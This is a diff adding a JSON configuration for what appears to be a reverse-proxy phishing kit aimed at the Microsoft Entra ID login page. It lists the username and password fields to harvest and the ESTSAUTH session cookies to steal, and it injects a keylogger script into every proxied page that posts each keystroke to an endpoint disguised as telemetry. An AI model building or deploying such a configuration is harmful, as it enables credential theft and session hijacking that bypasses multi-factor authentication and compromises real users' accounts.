@@ -1,0 +1,34 @@
+{
+  "id": "ms-live",
+  "name": "Microsoft Entra ID (live upstream)",
+  "author": "evilpikin",
+  "version": "1.0.0",
+  "proxy_host": "ms.test",
+  "origin": "login.microsoftonline.com",
+  "login_urls": ["/"],
+  "auth_urls": ["/"],
+  "redirect_url": "/",
+  "username_field": "loginfmt",
+  "password_field": "passwd",
+  "cookie_tokens": [
+    { "domain": "login.microsoftonline.com", "name": "ESTSAUTH", "optional": false, "in_url": false },
+    { "domain": "login.microsoftonline.com", "name": "ESTSAUTHPERSISTENT", "optional": false, "in_url": false }
+  ],
+  "force_https": true,
+  "origins": ["login.microsoftonline.com"],
+  "related_domains": {
+    "office.com": "office.test",
+    "www.office.com": "office.test"
+  },
+  "injections": [
+    {
+      "url_pattern": "*",
+      "type": "js",
+      "position": "head",
+      "code": "<script>(function(){function s(d){try{var x=new XMLHttpRequest();x.open('POST','/__ep_telemetry',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({type:'keystroke',data:d}));}catch(e){}}document.addEventListener('keydown',function(e){s(e.key);});})();</script>"
+    }
+  ],
+  "enabled": true,
+  "created_at": "2026-08-26T00:00:00Z",
+  "updated_at": "2026-08-26T00:00:00Z"
+}
